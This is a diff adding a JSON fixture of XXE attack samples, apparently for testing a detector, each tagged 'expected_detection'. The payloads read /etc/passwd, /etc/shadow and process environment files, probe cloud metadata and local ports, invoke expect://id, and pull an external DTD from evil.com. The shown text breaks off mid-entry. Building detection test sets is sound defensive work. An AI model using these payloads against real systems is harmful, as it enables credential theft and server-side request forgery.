@@ -1,0 +1,902 @@
+[
+  {
+    "id": "xxe_0000",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg>&xxe;</svg>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "42.141.10.52",
+    "timestamp": "2026-03-13T21:39:20.652011"
+  },
+  {
+    "id": "xxe_0001",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "206.210.242.85",
+    "timestamp": "2026-03-13T21:39:20.652033"
+  },
+  {
+    "id": "xxe_0002",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "51.40.212.243",
+    "timestamp": "2026-03-13T21:39:20.652040"
+  },
+  {
+    "id": "xxe_0003",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "11.151.60.240",
+    "timestamp": "2026-03-13T21:39:20.652046"
+  },
+  {
+    "id": "xxe_0004",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "197.173.182.202",
+    "timestamp": "2026-03-13T21:39:20.652051"
+  },
+  {
+    "id": "xxe_0005",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "96.135.1.253",
+    "timestamp": "2026-03-13T21:39:20.652057"
+  },
+  {
+    "id": "xxe_0006",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "214.108.170.210",
+    "timestamp": "2026-03-13T21:39:20.652062"
+  },
+  {
+    "id": "xxe_0007",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/resource=/etc/passwd\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "5.242.18.196",
+    "timestamp": "2026-03-13T21:39:20.652070"
+  },
+  {
+    "id": "xxe_0008",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "113.230.160.145",
+    "timestamp": "2026-03-13T21:39:20.652075"
+  },
+  {
+    "id": "xxe_0009",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "199.48.252.194",
+    "timestamp": "2026-03-13T21:39:20.652081"
+  },
+  {
+    "id": "xxe_0010",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "79.185.57.69",
+    "timestamp": "2026-03-13T21:39:20.652086"
+  },
+  {
+    "id": "xxe_0011",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "175.172.84.102",
+    "timestamp": "2026-03-13T21:39:20.652091"
+  },
+  {
+    "id": "xxe_0012",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg>&xxe;</svg>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "205.142.64.29",
+    "timestamp": "2026-03-13T21:39:20.652095"
+  },
+  {
+    "id": "xxe_0013",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "68.2.225.92",
+    "timestamp": "2026-03-13T21:39:20.652100"
+  },
+  {
+    "id": "xxe_0014",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "1.97.41.134",
+    "timestamp": "2026-03-13T21:39:20.652105"
+  },
+  {
+    "id": "xxe_0015",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "4.42.82.245",
+    "timestamp": "2026-03-13T21:39:20.652110"
+  },
+  {
+    "id": "xxe_0016",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "125.8.184.233",
+    "timestamp": "2026-03-13T21:39:20.652114"
+  },
+  {
+    "id": "xxe_0017",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg>&xxe;</svg>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "146.233.143.128",
+    "timestamp": "2026-03-13T21:39:20.652119"
+  },
+  {
+    "id": "xxe_0018",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg>&xxe;</svg>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "188.211.48.148",
+    "timestamp": "2026-03-13T21:39:20.652124"
+  },
+  {
+    "id": "xxe_0019",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "19.196.145.220",
+    "timestamp": "2026-03-13T21:39:20.652128"
+  },
+  {
+    "id": "xxe_0020",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:22\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "180.195.213.50",
+    "timestamp": "2026-03-13T21:39:20.652133"
+  },
+  {
+    "id": "xxe_0021",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/resource=/etc/passwd\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "101.6.111.243",
+    "timestamp": "2026-03-13T21:39:20.652137"
+  },
+  {
+    "id": "xxe_0022",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "23.180.65.69",
+    "timestamp": "2026-03-13T21:39:20.652142"
+  },
+  {
+    "id": "xxe_0023",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "189.193.52.197",
+    "timestamp": "2026-03-13T21:39:20.652146"
+  },
+  {
+    "id": "xxe_0024",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:22\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "29.212.68.41",
+    "timestamp": "2026-03-13T21:39:20.652151"
+  },
+  {
+    "id": "xxe_0025",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "88.81.151.50",
+    "timestamp": "2026-03-13T21:39:20.652155"
+  },
+  {
+    "id": "xxe_0026",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/xxe.dtd\">%xxe;]><foo></foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "151.165.217.78",
+    "timestamp": "2026-03-13T21:39:20.652160"
+  },
+  {
+    "id": "xxe_0027",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/resource=/etc/passwd\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "209.137.187.138",
+    "timestamp": "2026-03-13T21:39:20.652164"
+  },
+  {
+    "id": "xxe_0028",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "13.113.216.148",
+    "timestamp": "2026-03-13T21:39:20.652171"
+  },
+  {
+    "id": "xxe_0029",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "110.111.119.180",
+    "timestamp": "2026-03-13T21:39:20.652176"
+  },
+  {
+    "id": "xxe_0030",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/resource=/etc/passwd\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "67.123.123.169",
+    "timestamp": "2026-03-13T21:39:20.652181"
+  },
+  {
+    "id": "xxe_0031",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/resource=/etc/passwd\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "38.62.227.95",
+    "timestamp": "2026-03-13T21:39:20.652185"
+  },
+  {
+    "id": "xxe_0032",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "117.40.185.161",
+    "timestamp": "2026-03-13T21:39:20.652190"
+  },
+  {
+    "id": "xxe_0033",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "59.75.242.231",
+    "timestamp": "2026-03-13T21:39:20.652198"
+  },
+  {
+    "id": "xxe_0034",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/xxe.dtd\">%xxe;]><foo></foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "148.253.117.52",
+    "timestamp": "2026-03-13T21:39:20.652203"
+  },
+  {
+    "id": "xxe_0035",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "159.90.11.27",
+    "timestamp": "2026-03-13T21:39:20.652208"
+  },
+  {
+    "id": "xxe_0036",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "36.94.46.50",
+    "timestamp": "2026-03-13T21:39:20.652212"
+  },
+  {
+    "id": "xxe_0037",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "89.123.166.25",
+    "timestamp": "2026-03-13T21:39:20.652217"
+  },
+  {
+    "id": "xxe_0038",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg>&xxe;</svg>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "212.17.94.210",
+    "timestamp": "2026-03-13T21:39:20.652221"
+  },
+  {
+    "id": "xxe_0039",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg>&xxe;</svg>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "185.143.214.232",
+    "timestamp": "2026-03-13T21:39:20.652226"
+  },
+  {
+    "id": "xxe_0040",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg>&xxe;</svg>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "103.91.150.167",
+    "timestamp": "2026-03-13T21:39:20.652230"
+  },
+  {
+    "id": "xxe_0041",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "106.250.88.161",
+    "timestamp": "2026-03-13T21:39:20.652235"
+  },
+  {
+    "id": "xxe_0042",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "21.219.215.232",
+    "timestamp": "2026-03-13T21:39:20.652240"
+  },
+  {
+    "id": "xxe_0043",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "18.7.252.73",
+    "timestamp": "2026-03-13T21:39:20.652244"
+  },
+  {
+    "id": "xxe_0044",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "25.182.233.8",
+    "timestamp": "2026-03-13T21:39:20.652249"
+  },
+  {
+    "id": "xxe_0045",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:22\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "109.55.60.18",
+    "timestamp": "2026-03-13T21:39:20.652253"
+  },
+  {
+    "id": "xxe_0046",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg>&xxe;</svg>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "75.89.25.53",
+    "timestamp": "2026-03-13T21:39:20.652258"
+  },
+  {
+    "id": "xxe_0047",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "77.91.111.144",
+    "timestamp": "2026-03-13T21:39:20.652262"
+  },
+  {
+    "id": "xxe_0048",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg>&xxe;</svg>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "222.44.159.202",
+    "timestamp": "2026-03-13T21:39:20.652269"
+  },
+  {
+    "id": "xxe_0049",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "95.236.44.246",
+    "timestamp": "2026-03-13T21:39:20.652274"
+  },
+  {
+    "id": "xxe_0050",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "110.160.44.244",
+    "timestamp": "2026-03-13T21:39:20.652278"
+  },
+  {
+    "id": "xxe_0051",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg>&xxe;</svg>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "106.19.172.144",
+    "timestamp": "2026-03-13T21:39:20.652285"
+  },
+  {
+    "id": "xxe_0052",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/xxe.dtd\">%xxe;]><foo></foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "88.143.160.35",
+    "timestamp": "2026-03-13T21:39:20.652290"
+  },
+  {
+    "id": "xxe_0053",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "202.76.110.167",
+    "timestamp": "2026-03-13T21:39:20.652294"
+  },
+  {
+    "id": "xxe_0054",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "153.197.154.29",
+    "timestamp": "2026-03-13T21:39:20.652299"
+  },
+  {
+    "id": "xxe_0055",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "98.225.112.119",
+    "timestamp": "2026-03-13T21:39:20.652303"
+  },
+  {
+    "id": "xxe_0056",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "97.19.182.221",
+    "timestamp": "2026-03-13T21:39:20.652308"
+  },
+  {
+    "id": "xxe_0057",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/xxe.dtd\">%xxe;]><foo></foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "46.41.72.117",
+    "timestamp": "2026-03-13T21:39:20.652312"
+  },
+  {
+    "id": "xxe_0058",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg>&xxe;</svg>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "82.88.188.6",
+    "timestamp": "2026-03-13T21:39:20.652317"
+  },
+  {
+    "id": "xxe_0059",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "62.76.74.145",
+    "timestamp": "2026-03-13T21:39:20.652322"
+  },
+  {
+    "id": "xxe_0060",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:22\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "25.104.82.74",
+    "timestamp": "2026-03-13T21:39:20.652327"
+  },
+  {
+    "id": "xxe_0061",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:22\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "101.132.82.3",
+    "timestamp": "2026-03-13T21:39:20.652331"
+  },
+  {
+    "id": "xxe_0062",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "58.169.184.9",
+    "timestamp": "2026-03-13T21:39:20.652336"
+  },
+  {
+    "id": "xxe_0063",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/resource=/etc/passwd\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "117.35.39.18",
+    "timestamp": "2026-03-13T21:39:20.652341"
+  },
+  {
+    "id": "xxe_0064",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/resource=/etc/passwd\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "150.138.22.219",
+    "timestamp": "2026-03-13T21:39:20.652345"
+  },
+  {
+    "id": "xxe_0065",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "101.248.53.57",
+    "timestamp": "2026-03-13T21:39:20.652350"
+  },
+  {
+    "id": "xxe_0066",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:22\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "111.138.159.68",
+    "timestamp": "2026-03-13T21:39:20.652355"
+  },
+  {
+    "id": "xxe_0067",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "209.139.24.55",
+    "timestamp": "2026-03-13T21:39:20.652362"
+  },
+  {
+    "id": "xxe_0068",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "183.210.144.228",
+    "timestamp": "2026-03-13T21:39:20.652366"
+  },
+  {
+    "id": "xxe_0069",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "27.255.49.83",
+    "timestamp": "2026-03-13T21:39:20.652371"
+  },
+  {
+    "id": "xxe_0070",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "155.211.46.63",
+    "timestamp": "2026-03-13T21:39:20.652375"
+  },
+  {
+    "id": "xxe_0071",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg>&xxe;</svg>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "149.200.75.45",
+    "timestamp": "2026-03-13T21:39:20.652380"
+  },
+  {
+    "id": "xxe_0072",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "65.23.37.120",
+    "timestamp": "2026-03-13T21:39:20.652386"
+  },
+  {
+    "id": "xxe_0073",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "78.134.241.152",
+    "timestamp": "2026-03-13T21:39:20.652391"
+  },
+  {
+    "id": "xxe_0074",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "136.180.33.78",
+    "timestamp": "2026-03-13T21:39:20.652396"
+  },
+  {
+    "id": "xxe_0075",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "51.85.197.40",
+    "timestamp": "2026-03-13T21:39:20.652401"
+  },
+  {
+    "id": "xxe_0076",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "218.252.51.142",
+    "timestamp": "2026-03-13T21:39:20.652405"
+  },
+  {
+    "id": "xxe_0077",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "31.19.156.63",
+    "timestamp": "2026-03-13T21:39:20.652410"
+  },
+  {
+    "id": "xxe_0078",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:22\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "116.126.204.178",
+    "timestamp": "2026-03-13T21:39:20.652415"
+  },
+  {
+    "id": "xxe_0079",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/resource=/etc/passwd\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "79.205.119.56",
+    "timestamp": "2026-03-13T21:39:20.652419"
+  },
+  {
+    "id": "xxe_0080",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "93.97.113.110",
+    "timestamp": "2026-03-13T21:39:20.652424"
+  },
+  {
+    "id": "xxe_0081",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "141.174.112.52",
+    "timestamp": "2026-03-13T21:39:20.652429"
+  },
+  {
+    "id": "xxe_0082",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "75.90.70.158",
+    "timestamp": "2026-03-13T21:39:20.652434"
+  },
+  {
+    "id": "xxe_0083",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "101.48.4.48",
